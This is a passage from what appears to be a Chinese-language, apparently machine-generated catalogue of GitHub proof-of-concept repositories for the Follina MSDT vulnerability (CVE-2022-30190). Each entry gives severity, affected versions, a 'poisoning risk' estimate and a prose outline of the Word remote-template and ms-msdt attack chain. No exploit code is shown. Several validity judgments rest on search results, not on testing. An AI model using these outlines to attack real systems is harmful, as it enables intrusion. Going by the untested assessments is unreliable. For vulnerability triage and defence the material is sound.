4.  **执行任意代码：** 攻击者可以利用此漏洞在目标系统上执行任意代码，例如安装恶意软件、窃取敏感数据或控制系统。

总而言之，CVE-2022-30190是一个高危漏洞，攻击者可以利用它在受影响的系统上执行任意代码。用户应尽快采取必要的安全措施，例如安装补丁或禁用MSDT协议处理程序，以防止受到攻击。

**项目地址:** [melting0256/Enterprise-Cybersecurity](https://github.com/melting0256/Enterprise-Cybersecurity)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #26

**来源**: [CVE-2022-30190-michealadams30_Cve-2022-30190.md](../2022/CVE-2022-30190-michealadams30_Cve-2022-30190.md)

## CVE-2022-30190-Microsoft MSDT RCE-Follina

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码，控制系统。

**影响版本:** 见漏洞库信息

**利用条件:** 需要用户打开恶意构造的文档或点击恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个Microsoft Office漏洞，攻击者通过Word等程序调用MSDT，并利用URL协议从远程Web服务器检索HTML文件。该HTML文件包含恶意代码，从而在受害者系统上执行任意命令。漏洞利用涉及诱使用户打开恶意构造的文档（例如，通过电子邮件附件）。

**有效性：**
提供的Python POC代码看起来是有效的，它生成恶意文档或利用方式，并设置一个Web服务器来托管payload。代码包含从用户收集必要信息（如目标IP、端口、文件扩展名等）的部分，并创建所需的文件结构，表明具有利用该漏洞的能力。

**投毒风险：**
代码中可能存在投毒风险。虽然代码的主要功能是生成漏洞利用所需的文件，但攻击者可能在以下方面进行投毒：

*   **Web服务器payload：** 托管在Web服务器上的实际payload可能包含恶意代码，不仅执行预期的命令，还执行其他恶意操作，例如安装后门、窃取敏感信息等。
*   **生成的文档：**  生成的文档本身可能包含超出漏洞利用范围的恶意内容。

因此，存在一定风险，但代码整体结构看似为生成漏洞利用文件，投毒风险较低，预估投毒风险为10%。

**利用方式：**
1.  攻击者创建一个恶意构造的Word文档（或其他支持的文档类型）。
2.  该文档包含一个链接或引用，指向攻击者控制的Web服务器上的一个HTML文件。
3.  当用户打开该文档时，Word会尝试通过MSDT和URL协议检索该HTML文件。
4.  恶意HTML文件包含执行任意代码的payload。
5.  该payload在受害者系统上执行，从而允许攻击者控制系统。

**项目地址:** [michealadams30/Cve-2022-30190](https://github.com/michealadams30/Cve-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #27

**来源**: [CVE-2022-30190-seinab-ibrahim_Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis.md](../2022/CVE-2022-30190-seinab-ibrahim_Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis.md)

## CVE-2022-30190 (Follina) Microsoft MSDT 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本包括但不限于Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022

**利用条件:** 需要用户打开恶意构造的文档或URL，且MSDT需要被调用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。 

**有效性评估：**
根据漏洞库信息和搜索结果，此漏洞已得到确认，并且存在公开可用的PoC（Proof of Concept）代码。 搜索结果显示该漏洞被广泛讨论和利用，因此可以判断提供的PoC代码是有效的。 尽管提供的`README.md`文件仅仅是描述性的，但意味着完整的仓库中包含可利用的POC代码

**投毒风险分析：**
提供的漏洞利用代码只是一个 `README.md` 文件，主要描述了漏洞的分析和利用。 由于仅仅是描述性文件，无法从中直接判断是否存在投毒代码。但如果完整的仓库中存在其他恶意脚本，例如伪装成正常利用代码的后门，则存在投毒风险。根据文件内容，倾向于是一个教学和研究项目，投毒的可能性较低，因此判断投毒风险约为 10%。

**利用方式：**
1.  攻击者利用Microsoft Office (例如Word) 的远程模板功能。
2.  构造一个包含恶意链接的文档，该链接指向一个远程Web服务器。
3.  当用户打开该文档时，Word会从远程Web服务器检索HTML文件。
4.  该HTML文件包含恶意的MSDT协议URL，用于调用MSDT。
5.  MSDT被调用时，会执行攻击者预设的任意代码，从而实现远程代码执行。

**总结：**
CVE-2022-30190 (Follina) 是一个高危漏洞，利用简单，影响范围广。攻击者可以通过诱使用户打开恶意文档或URL来触发该漏洞。虽然提供的PoC文件本身不包含恶意代码，但仍需谨慎使用，并确保从可信来源获取完整的PoC代码。

**项目地址:** [seinab-ibrahim/Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis](https://github.com/seinab-ibrahim/Follina-Vulnerability-CVE-2022-30190-Exploit-Analysis)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #28

**来源**: [CVE-2022-30190-shri142_ZipScan.md](../2022/CVE-2022-30190-shri142_ZipScan.md)

## CVE-2022-30190 (Follina) MSDT 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码，可能导致系统完全控制

**影响版本:** 受影响的Windows版本众多，具体版本范围请参考漏洞库信息

**利用条件:** 用户需要打开恶意构造的文档（如Word文档），或者点击恶意链接。调用程序（如Word）需要存在漏洞影响版本中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。当 MSDT 被调用应用程序（如 Word）使用 URL 协议调用时，就会出现此漏洞。攻击者可以构造恶意的 Word 文档，该文档利用 Word 的远程模板功能从远程 Web 服务器检索 HTML 文件。此 HTML 文件包含一个使用 `ms-msdt` 协议处理方案的恶意 JavaScript 代码，可以执行任意代码。

**漏洞利用方式:**
1.  攻击者创建一个包含恶意链接或嵌入恶意HTML的Word文档。
2.  受害者打开该文档。
3.  Word尝试从远程服务器加载HTML模板。
4.  远程HTML利用`ms-msdt`协议调用MSDT。
5.  MSDT执行HTML中嵌入的恶意代码，从而在受害者系统上执行任意命令。

**有效性:**
提供的代码是一个扫描器，用于检测文件中是否存在 Follina 漏洞。 它不是漏洞利用代码，而是用于分析文件是否包含该漏洞的特征。

**投毒风险:**
提供的 Go 代码主要功能是扫描文件，检测是否存在 CVE-2022-30190 (Follina) 漏洞的特征。代码本身包含一定的投毒风险的可能性，因为扫描器本身可能被利用来传播恶意文件，虽然扫描器本身功能没有直接执行恶意代码，但仍然存在潜在的风险：

1.  **依赖包风险:** 检查 `go.mod` 和 `go.sum` 文件，确认所有依赖包的来源是否可信，以及版本是否安全。恶意依赖包可能会引入漏洞或后门。
2.  **扫描逻辑缺陷:** 扫描逻辑中可能存在缺陷，导致误报或漏报。攻击者可能利用这些缺陷来隐藏恶意代码，绕过扫描器的检测。
3.  **供应链攻击:** 攻击者可能篡改代码仓库，在扫描器中植入恶意代码。用户下载并运行被篡改的扫描器后，可能会受到攻击。
4.  **代码执行环境风险:** 运行扫描器的环境可能存在安全漏洞。攻击者可能利用这些漏洞来提升权限，执行恶意代码。

虽然代码的主要目的是安全扫描，但由于软件开发和分发的复杂性，仍然存在一定的风险。使用者应当保持警惕，确保从可信的来源获取代码，并进行充分的安全审查。

风险评估：10% 风险可能性体现在扫描器可能被恶意利用或包含隐藏的漏洞，但主要功能是扫描而非攻击，因此投毒风险较低。

**项目地址:** [shri142/ZipScan](https://github.com/shri142/ZipScan)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #29

**来源**: [CVE-2022-30190-skitkat_CVE-2022-30190-POC.md](../2022/CVE-2022-30190-skitkat_CVE-2022-30190-POC.md)

## CVE-2022-30190 - Microsoft MSDT Follina 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可利用该漏洞在目标系统上执行任意代码

**影响版本:** 受影响的版本包括Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022等，具体版本范围见漏洞库信息。

**利用条件:** 需要用户打开包含恶意链接或文件的文档，例如Word文档。 或者通过其他调用程序触发MSDT。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT)中的远程代码执行漏洞。攻击者可以通过诱使用户打开特制的文档(例如Word文档)来触发该漏洞。该文档利用Word的远程模板功能从远程服务器检索HTML文件，其中包含恶意代码。当MSDT被调用并使用URL协议时，就会触发此漏洞，允许攻击者以调用应用程序的权限执行任意代码。这可能导致安装程序、查看/更改/删除数据或创建新帐户。

**漏洞利用方式：**
1.  攻击者创建一个包含恶意代码的Word文档或其他支持远程模板的文档。
2.  该文档包含一个指向攻击者控制的远程服务器的链接，该服务器托管一个包含恶意HTML代码的文件。
3.  当用户打开该文档时，Word会从远程服务器下载HTML文件。
4.  HTML文件中的恶意代码使用`ms-msdt:`协议调用MSDT，并传递恶意参数。
5.  MSDT解析恶意参数并执行攻击者指定的代码。

**有效性：**
根据搜索结果和漏洞库信息，该漏洞已被积极利用，并且存在公开的POC代码。
提供的Cargo.lock文件只是Rust项目的依赖锁文件，本身不包含漏洞利用代码，不能直接验证漏洞是否有效。但该文件表明该项目可能与该漏洞的利用有关，需要进一步分析项目源代码才能确定。

**投毒风险：**
Cargo.lock文件本身不包含可执行代码，因此直接通过该文件进行投毒的可能性较低。但是，如果该项目包含恶意构建脚本或者依赖了被投毒的第三方库，则可能存在投毒风险。初步判断该仓库存在一定比例的投毒风险，约10%，需要进一步分析项目源代码，检查是否存在以下情况：
*   构建脚本中是否包含恶意代码。
*   依赖项中是否存在已知被投毒的库。
*   是否存在其他可疑的文件或代码。

需要强调的是，在未对整个代码库进行彻底审查的情况下，无法完全排除投毒风险。

**项目地址:** [skitkat/CVE-2022-30190-POC](https://github.com/skitkat/CVE-2022-30190-POC)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #30

**来源**: [CVE-2022-30190-swaiist_CVE-2022-30190-Fix.md](../2022/CVE-2022-30190-swaiist_CVE-2022-30190-Fix.md)

## CVE-2022-30190-MSDT远程代码执行

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能允许攻击者在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本，详见漏洞库信息

**利用条件:** 用户需要打开包含恶意链接或文件的文档

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-30190（又名Follina）是一个远程代码执行漏洞，存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中。攻击者可以利用此漏洞通过精心构造的恶意文档（例如Word文档）或通过URL协议调用MSDT来执行任意代码。当用户打开包含恶意链接或文件的文档时，该漏洞会被触发。根据搜索结果，攻击者利用Word的远程模板功能从远程服务器检索HTML文件，然后利用MSDT执行代码。提供的PoC代码中，execute.bat脚本首先备份 `HKEY_CLASSES_ROOT\ms-msdt` 注册表项到桌面上的`backup-for-msdt`文件中，然后删除该注册表项。restore.bat脚本则将备份的注册表项导入回来。这两个脚本本身并不会执行任何恶意代码，而是用于删除和恢复MSDT的注册表关联，通常是利用流程的一部分，用于绕过某些缓解措施或用于测试。因此，仓库本身提供的PoC代码没有发现作者隐藏的投毒代码。

**有效性：**
根据漏洞描述和搜索结果，以及PoC涉及的操作，该PoC代码是漏洞利用链的一部分，主要用于修改MSDT的注册表关联。结合其他步骤（例如，通过Word远程模板下载恶意HTML），可以实现远程代码执行。

**利用方式：**
1.  攻击者创建一个包含恶意链接或嵌入恶意OLE对象的文档（例如Word文档）。
2.  当用户打开文档时，Word会尝试从远程服务器加载HTML文件（通过远程模板功能）。
3.  恶意HTML文件利用`ms-msdt:` URL协议调用MSDT。
4.  MSDT被触发，执行HTML文件中包含的恶意代码。
5.  攻击者可以利用该漏洞在受害者系统上执行任意命令。  提供的PoC 代码中的`execute.bat` 通过删除`HKEY_CLASSES_ROOT\ms-msdt` 注册表关联，在恢复前，可能允许攻击者控制MSDT的行为或执行流程。`restore.bat`脚本用于恢复该关联，在攻击之后清理环境。

**投毒风险评估：**
PoC 代码本身主要用于注册表操作，没有发现明显的恶意代码。但是，由于PoC通常需要结合其他恶意文件（例如HTML或Word文档）才能完成攻击，因此，投毒风险主要存在于这些其他组件中。但是仅从提供的bat文件来判断，投毒风险较低。

**项目地址:** [swaiist/CVE-2022-30190-Fix](https://github.com/swaiist/CVE-2022-30190-Fix)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #31

**来源**: [CVE-2022-30190-winstxnhdw_CVE-2022-30190.md](../2022/CVE-2022-30190-winstxnhdw_CVE-2022-30190.md)

## CVE-2022-30190 (Follina) MSDT 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本包括Windows 7到Windows 11以及多个Windows Server版本，具体版本范围参考漏洞库信息。

**利用条件:** 需要用户打开包含恶意代码的文档（如Word文档），或者访问包含恶意链接的网页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以利用此漏洞，通过构造恶意的Word文档或其他方式，诱使用户打开，从而在用户系统上执行任意代码。 

**有效性评估：**

根据漏洞库信息和搜索结果，此漏洞在野外被广泛利用，POC代码的存在进一步证明了其有效性。提供的PoC代码描述了如何生成一个包含恶意链接的Word文档，当用户打开此文档时，MSDT会被调用，执行攻击者预先设定的恶意代码。

**投毒风险评估：**

分析提供的PoC代码，投毒风险较低，约为10%。主要风险点可能存在于以下几个方面：

1.  **init.py:** 该脚本用于构建恶意Word文档和初始化攻击者服务器。代码本身没有明显的恶意行为，但如果`build_payload`函数中的powershell命令被替换为更具破坏性的命令，则可能导致更严重的后果。
2.  **config.xml:** 该配置文件定义了攻击者服务器的主机名和端口。如果攻击者将此值更改为指向恶意服务器，则可能导致受害者下载和执行恶意软件。
3.  **build/href.txt:** 该文件包含用于触发漏洞的HTML代码。攻击者可能会修改此文件，以执行其他恶意操作。

但是，总体而言，提供的PoC代码主要用于演示漏洞，而不是用于传播恶意软件。 `destroy_all.bat`脚本的存在也一定程度上降低了风险，因为该脚本可以帮助用户删除所有相关文件。

**利用方式分析：**

1.  攻击者首先编辑`config.xml`，设置攻击者服务器的hostname和port。
2.  运行`dotnet publish LocalEXF`编译payload。
3.  运行`init.py`脚本，该脚本会：
    *   构建包含恶意链接的Word文档（trojan.docx）。
    *   在攻击者服务器上托管一个包含恶意Payload的HTML文件。
    *   base64 编码 PowerShell 命令。
4.  攻击者将此Word文档发送给受害者。
5.  受害者打开Word文档，MSDT会被调用，执行攻击者服务器上托管的Payload，从而在受害者系统上执行任意代码。

需要注意的是，要成功利用此漏洞，受害者需要卸载安全更新KB5016616，并且命令运行时间要短，否则会出现故障排除程序。


**项目地址:** [winstxnhdw/CVE-2022-30190](https://github.com/winstxnhdw/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #32

**来源**: [CVE-2022-30190-yeep1115_ICT287_CVE-2022-30190_Exploit.md](../2022/CVE-2022-30190-yeep1115_ICT287_CVE-2022-30190_Exploit.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本和Office版本见漏洞库信息

**利用条件:** 需要用户打开恶意Word文档

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个远程代码执行漏洞，存在于Microsoft Windows Support Diagnostic Tool (MSDT)中。攻击者可以利用此漏洞通过特制的Word文档，使用Word的远程模板功能从远程Web服务器检索HTML文件，从而在受害者系统上执行任意代码。

**有效性：** 根据漏洞信息、搜索结果和提供的POC代码，该漏洞利用是有效的。漏洞库信息和搜索结果都表明这是一个真实存在的、被广泛利用的漏洞。POC代码（虽然只是一个README.md文件）指向了一个实际的利用项目，说明了利用方式和受影响的系统版本，证明了漏洞的可利用性。

**投毒风险：** 分析提供的仓库内容，风险评估如下：

*   **README.md文件：** 本身不包含任何可执行代码，因此直接的投毒风险较低。
*   **外部链接：**  主要风险在于指向的`Hrishikesh7665/Follina_Exploiter_CLI`仓库。虽然原作者注明了License，但是仍然存在投毒的可能性。

综合分析，考虑到代码仓库可能存在恶意修改的风险，虽然直接投毒可能性较低，但间接风险不可忽视，因此评估投毒风险为10%。

**利用方式：** 漏洞的利用方式通常包括以下步骤：

1.  **构造恶意Word文档：** 攻击者创建一个包含恶意链接的Word文档。该链接指向一个由攻击者控制的远程Web服务器，并使用`ms-msdt:` URL协议调用MSDT。
2.  **诱骗受害者打开文档：** 攻击者通过电子邮件、社交媒体或其他方式将恶意文档发送给受害者。
3.  **执行恶意代码：** 当受害者打开文档时，Word会尝试从远程服务器检索HTML文件。该HTML文件包含恶意JavaScript代码，该代码利用MSDT执行任意命令。
4.  **控制系统：** 通过执行的命令，攻击者可以在受害者系统上安装恶意软件、窃取数据或执行其他恶意活动。

**项目地址:** [yeep1115/ICT287_CVE-2022-30190_Exploit](https://github.com/yeep1115/ICT287_CVE-2022-30190_Exploit)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #33

**来源**: [CVE-2022-30190-yrkuo_CVE-2022-30190.md](../2022/CVE-2022-30190-yrkuo_CVE-2022-30190.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码，可能导致系统完全控制

**影响版本:** 受影响的Windows版本众多，详见漏洞库信息

**利用条件:** 需要用户打开恶意构造的文档（例如Word文档）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Support Diagnostic Tool (MSDT)中的远程代码执行漏洞。攻击者可以通过构造恶意的Word文档，利用Word的远程模板功能从远程服务器检索HTML文件。该HTML文件包含恶意JavaScript代码，通过ms-msdt协议调用MSDT，从而执行任意命令。

**有效性：**
提供的POC代码是有效的，它展示了如何构造一个包含恶意OLE对象的Word文档，该对象指向一个包含恶意HTML payload的远程服务器。John Hammond的follina.py脚本可以用来生成payload，该payload利用ms-msdt协议执行calc.exe作为概念验证。

**投毒风险：**
仓库本身投毒的概率较低，约为10%。风险主要来自于以下几个方面：
*   **远程Payload：** HTML payload从攻击者控制的服务器提供，因此存在被篡改或替换的风险。攻击者可以更改payload，以执行恶意活动。
*   **follina.py脚本：** follina.py脚本本身可能包含隐藏的恶意代码，虽然John Hammond的脚本相对可信，但仍存在一定的风险。
*   **依赖性：** 该利用方法依赖于特定的软件版本和配置，未来可能会因补丁或更新而失效。

**利用方式：**
1.  攻击者创建一个恶意的Word文档（.docx）。
2.  该文档包含一个指向攻击者控制的远程服务器的OLE对象。
3.  当用户打开该文档时，Word会尝试从远程服务器检索HTML文件。
4.  该HTML文件包含恶意JavaScript代码，使用ms-msdt协议调用MSDT。
5.  MSDT执行攻击者指定的命令，从而导致远程代码执行。

**缓解措施：**
*   安装Microsoft提供的安全更新。
*   禁用MSDT协议（虽然可能影响系统功能）。
*   谨慎打开来自未知来源的文档。

**项目地址:** [yrkuo/CVE-2022-30190](https://github.com/yrkuo/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---



---



---



---



---



---



---



---



---

